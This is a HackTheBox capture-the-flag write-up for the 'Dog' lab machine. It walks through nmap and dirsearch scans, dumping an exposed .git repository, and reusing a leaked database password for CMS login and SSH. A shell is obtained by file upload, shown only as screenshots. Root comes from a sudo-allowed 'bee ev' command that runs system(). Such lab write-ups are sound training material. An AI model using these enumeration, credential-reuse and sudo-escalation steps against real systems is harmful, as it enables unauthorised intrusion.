---
title: dog.htb
date: 2025-03-08
categories:
  - hackthebox
tags:
  - ctf
  - htb
  - linux
  - easy
---
## User flag

As always we start off with a nmap scan.
### nmap
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-08 22:24 CET
Nmap scan report for 10.10.11.58
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-title: Home | Dog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
```

Appearently there is http server running on port 80 and it seems a .git repo was detected by nmap.

We should always try to enumerate the webserver for folders.
### dirsearch
```[22:28:45] Starting:                                                                                                         
[22:28:47] 301 -  301B  - /.git  ->  http://dog.htb/.git/                   
[22:28:47] 200 -  405B  - /.git/branches/                                   
[22:28:47] 200 -   95B  - /.git/COMMIT_EDITMSG
[22:28:47] 200 -   92B  - /.git/config
[22:28:47] 200 -   73B  - /.git/description
[22:28:47] 200 -   23B  - /.git/HEAD                                        
[22:28:47] 200 -  601B  - /.git/
[22:28:47] 200 -  648B  - /.git/hooks/                                      
[22:28:47] 200 -  453B  - /.git/info/                                       
[22:28:47] 200 -  240B  - /.git/info/exclude                                
[22:28:47] 200 -  473B  - /.git/logs/                                       
[22:28:47] 200 -  230B  - /.git/logs/HEAD
[22:28:47] 301 -  311B  - /.git/logs/refs  ->  http://dog.htb/.git/logs/refs/
[22:28:47] 301 -  317B  - /.git/logs/refs/heads  ->  http://dog.htb/.git/logs/refs/heads/
[22:28:47] 200 -  230B  - /.git/logs/refs/heads/master
[22:28:47] 301 -  312B  - /.git/refs/heads  ->  http://dog.htb/.git/refs/heads/
[22:28:47] 200 -  456B  - /.git/refs/
[22:28:47] 200 -   41B  - /.git/refs/heads/master
[22:28:47] 301 -  311B  - /.git/refs/tags  ->  http://dog.htb/.git/refs/tags/
[22:28:47] 200 -  337KB - /.git/index                                       
[22:28:47] 200 -    2KB - /.git/objects/                                    
[22:28:48] 403 -  272B  - /.ht_wsr.txt                                      
[22:28:48] 403 -  272B  - /.htaccess.bak1                                   
[22:28:48] 403 -  272B  - /.htaccess.orig                                   
[22:28:48] 403 -  272B  - /.htaccess.sample
[22:28:48] 403 -  272B  - /.htaccess.save
[22:28:48] 403 -  272B  - /.htaccess_extra                                  
[22:28:48] 403 -  272B  - /.htaccess_orig
[22:28:48] 403 -  272B  - /.htaccess_sc
[22:28:48] 403 -  272B  - /.htaccessBAK
[22:28:48] 403 -  272B  - /.htaccessOLD
[22:28:48] 403 -  272B  - /.htaccessOLD2
[22:28:48] 403 -  272B  - /.htm                                             
[22:28:48] 403 -  272B  - /.html                                            
[22:28:48] 403 -  272B  - /.htpasswd_test                                   
[22:28:48] 403 -  272B  - /.httr-oauth
[22:28:48] 403 -  272B  - /.htpasswds
[22:28:48] 403 -  272B  - /.php                                             
[22:28:54] 301 -  301B  - /core  ->  http://dog.htb/core/                   
[22:28:55] 301 -  302B  - /files  ->  http://dog.htb/files/                 
[22:28:55] 200 -  584B  - /files/                                           
[22:28:56] 200 -    4KB - /index.php                                        
[22:28:56] 404 -    2KB - /index.php/login/                                 
[22:28:57] 200 -  453B  - /layouts/                                         
[22:28:57] 200 -    7KB - /LICENSE.txt                                      
[22:28:58] 301 -  304B  - /modules  ->  http://dog.htb/modules/             
[22:28:58] 200 -  400B  - /modules/                                         
[22:29:00] 200 -    5KB - /README.md                                        
[22:29:00] 200 -  528B  - /robots.txt                                       
[22:29:01] 403 -  272B  - /server-status                                    
[22:29:01] 403 -  272B  - /server-status/
[22:29:01] 200 -    0B  - /settings.php                                     
[22:29:01] 301 -  302B  - /sites  ->  http://dog.htb/sites/                 
[22:29:02] 301 -  303B  - /themes  ->  http://dog.htb/themes/               
[22:29:02] 200 -  451B  - /themes/                                          
```

We can use the tool git-dumper to dump the git repository and look for credentials found in the source code.

```bash
git-dumper http://dog.htb/.git/  ./dog-git
```

We can try to grep the files for users and passwords.

```bash
grep -r "@dog.htb"
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

There is also a settings.php file containing a password.
```bash
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

### shell

Using those credentials we can login into the the website hosted on port 80 and upload a file which gives us a shell.

![[Pasted image 20250323203931.png]]


![[Pasted image 20250323204024.png]]



Once we get a shell we can enumerate the box. There is a mysql database running which has credentials. 

### credentials
```
ssh johncusack@dog.htb
BackDropJ2024DS2024

```

### root 

We can login via ssh with those credentials. Running sudo -l we see there is a command which can be run by the user.

```bash
sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

Running the following sudo command we get to execute code as root.

```bash
sudo /usr/local/bin/bee ev "system 'whoami');" 
﻿root
```


## Summary 

Through a combination of thorough enumeration, exploiting misconfigurations, and leveraging discovered credentials, we successfully gained access to the target machine. By exploiting a vulnerable command allowed via `sudo`, we escalated our privileges to root, completing the challenge. This CTF highlights the importance of meticulous reconnaissance, understanding common vulnerabilities, and the effective use of tools to achieve privilege escalation.